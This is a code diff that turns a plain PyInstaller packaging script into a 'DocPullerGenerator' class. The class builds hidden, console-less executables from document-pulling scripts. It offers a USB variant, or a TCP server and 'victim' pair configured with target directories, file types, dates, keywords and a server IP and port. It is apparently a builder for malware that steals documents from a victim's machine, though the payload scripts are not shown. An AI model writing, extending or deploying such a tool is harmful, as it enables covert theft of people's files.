@@ -3,49 +3,44 @@ from tkinter import Tk
 from tkinter.filedialog import askdirectory
 import sys
 
-# Specify the path to the Python script you want to convert to an executable
-script_path = "/real/gui.py"
+from Generator.Modoles.fronzen_objects_geneartor import FrozenObjectGeneartor
 
-# Specify additional PyInstaller options if needed
-options = [
-    "--onefile",  # Generate a single executable file
-    "--noconsole"  # Exclude the console window (optional, for GUI applications)
-]
 
-# Prompt the user to select the directory for saving the executable
-Tk().withdraw()  # Hide the main window
-save_dir = askdirectory(title="Select Directory for Saving Executable")
+class DocPullerGenerator:
 
-# If the user canceled the directory selection, exit the script
-if not save_dir:
-    sys.exit()
+    def __init__(self, save_dir, is_usb, direcoties, file_type, date, keywords, server_ip, server_port):
+        self.save_dir = save_dir
+        self.is_usb = is_usb
+        self.direcoties = direcoties
+        self.file_type = file_type
+        self.date = date
+        self.keywords = keywords
+        self.server_ip = server_ip
+        self.server_port = server_port
+        self.DOCPULLER_USB_EXE_PATH = 'Generator/DocPullerScriptsToExe/DocPullerUSB_Exe.py'
+        self.DOCPULLER_FTP_SERVER_EXE_PATH = 'Generator/DocPullerScriptsToExe/DocPullerTCP_Server_Exe.py'
+        self.DOCPULLER_FTP_VICTIM_EXE_PATH = 'Generator/DocPullerScriptsToExe/DocPullerTCP_Victim_Exe.py'
 
-# Set the output directory option for PyInstaller
-output_dir = f"--distpath={save_dir}"
-options.append(output_dir)
+        # Specify additional PyInstaller options if needed
+        self.options = [
+            "--onefile",
+            "--noconsole",
+            f"--distpath={self.save_dir}"
+        ]
 
-# Run PyInstaller
-command = ["pyinstaller", script_path] + options
+        FrozenObjectGeneartor(is_usb, direcoties, file_type, date, keywords, server_ip, server_port).main()
 
-process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
+        # Run PyInstaller
 
-# Start the progress bar
-sys.stdout.write("Conversion progress: [          ]")
-sys.stdout.flush()
-
-progress = 0
-progress_bar_length = 10
-progress_increment = 100 / progress_bar_length
-
-# Read the output and update the progress bar
-for line in process.stdout:
-    if "Building" in line:
-        progress += progress_increment
-        num_filled = int(progress / progress_increment)
-        num_empty = progress_bar_length - num_filled
-        progress_bar = "[" + "=" * num_filled + " " * num_empty + "]"
-        sys.stdout.write("\rConversion progress: " + progress_bar)
-        sys.stdout.flush()
-
-sys.stdout.write("\nConversion completed!\n")
-sys.stdout.flush()
+    def main(self):
+        if self.is_usb:
+            command = ["pyinstaller", self.DOCPULLER_USB_EXE_PATH] + self.options
+            subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                   universal_newlines=True)
+        else:
+            command = ["pyinstaller", self.DOCPULLER_FTP_SERVER_EXE_PATH] + self.options
+            subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                             universal_newlines=True)
+            command = ["pyinstaller", self.DOCPULLER_FTP_VICTIM_EXE_PATH] + self.options
+            subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                             universal_newlines=True)
